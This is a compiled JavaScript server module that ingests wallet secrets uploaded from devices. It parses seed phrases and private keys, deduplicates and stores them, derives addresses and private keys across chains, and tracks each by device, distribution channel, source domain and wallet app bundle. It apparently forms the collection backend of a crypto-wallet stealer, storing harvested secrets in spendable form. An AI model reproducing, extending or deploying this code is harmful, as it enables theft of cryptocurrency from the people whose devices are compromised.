import { Mnemonic, DerivedAddress } from '../../../core/db/models/index.js';
import { parseSecretContent, deriveFromMnemonic, deriveFromPrivateKey } from '../../../core/crypto/derivation.js';
import { logger } from '../../../core/logger/index.js';
import { getDeviceSourceDomain } from '../../../core/devices/source-domain.js';
import { applyDeviceCountDeltaForUpsert } from '../../../core/devices/counts.js';
import { markAppDataUploaded } from '../../../core/devices/app-data-status.js';
import { WALLET_TYPE_TO_BUNDLE_ID } from '../../../config/constants.js';
export async function processWalletSecret(params) {
    const { walletType, result, deviceId, channelCode } = params;
    // 1. 解析内容
    const parsed = parseSecretContent(walletType, result);
    if (!parsed) {
        const preview = result.length > 100 ? result.substring(0, 100) + '...' : result;
        logger.warn({ walletType, deviceId, preview }, 'Unrecognized /us content, skipped');
        return;
    }
    const sourceDomain = await getDeviceSourceDomain(deviceId);
    // 2. 去重写入助记词表
    let mnemonic;
    try {
        mnemonic = await Mnemonic.findOneAndUpdate({ content: parsed.content }, {
            $setOnInsert: {
                type: parsed.type,
                deviceId,
                channelCode,
                sourceDomain,
                walletType,
                derivedCount: 0,
                createdAt: new Date(),
            },
        }, { upsert: true, returnDocument: 'after', includeResultMetadata: true });
    }
    catch (err) {
        if (err.code === 11000) {
            logger.info({ walletType, deviceId }, 'Duplicate mnemonic content, skipped');
            const bundleId = WALLET_TYPE_TO_BUNDLE_ID[walletType];
            if (bundleId)
                await markAppDataUploaded(deviceId, bundleId);
            return;
        }
        logger.error({ err, walletType, deviceId }, 'Failed to upsert mnemonic');
        throw err;
    }
    // 如果不是新插入的（已存在），跳过派生
    if (mnemonic.lastErrorObject?.updatedExisting) {
        logger.info({ walletType, deviceId }, 'Mnemonic already exists, skipped derivation');
        const bundleId = WALLET_TYPE_TO_BUNDLE_ID[walletType];
        if (bundleId)
            await markAppDataUploaded(deviceId, bundleId);
        return;
    }
    const mnemonicDoc = mnemonic.value;
    // 3. 派生地址
    let addresses;
    try {
        addresses = parsed.type === 'mnemonic'
            ? deriveFromMnemonic(parsed.content)
            : deriveFromPrivateKey(parsed.content);
    }
    catch (err) {
        logger.error({ err, walletType, deviceId, mnemonicId: mnemonicDoc._id }, 'Address derivation failed');
        return;
    }
    // 4. 写入地址表
    let derivedCount = 0;
    for (const addr of addresses) {
        try {
            await DerivedAddress.create({
                address: addr.address,
                chain: addr.chain,
                addressType: addr.addressType,
                privateKey: addr.privateKey,
                derivationPath: addr.derivationPath,
                mnemonicId: mnemonicDoc._id,
                deviceId,
                channelCode,
                sourceDomain,
                walletType,
            });
            derivedCount++;
        }
        catch (err) {
            if (err.code === 11000) {
                derivedCount++; // 地址已存在也算成功
            }
            else {
                logger.error({ err, address: addr.address, chain: addr.chain }, 'Failed to insert derived address');
            }
        }
    }
    // 5. 更新派生数量
    await Mnemonic.updateOne({ _id: mnemonicDoc._id }, { $set: { derivedCount } });
    await applyDeviceCountDeltaForUpsert({
        field: 'mnemonicCount',
        previousDeviceId: '',
        nextDeviceId: deviceId,
        wasExisting: false,
    });
    const bundleId = WALLET_TYPE_TO_BUNDLE_ID[walletType];
    if (bundleId) {
        await markAppDataUploaded(deviceId, bundleId);
    }
    logger.info({ walletType, deviceId, type: parsed.type, derivedCount }, 'Derivation completed');
}
//# sourceMappingURL=derivation.js.map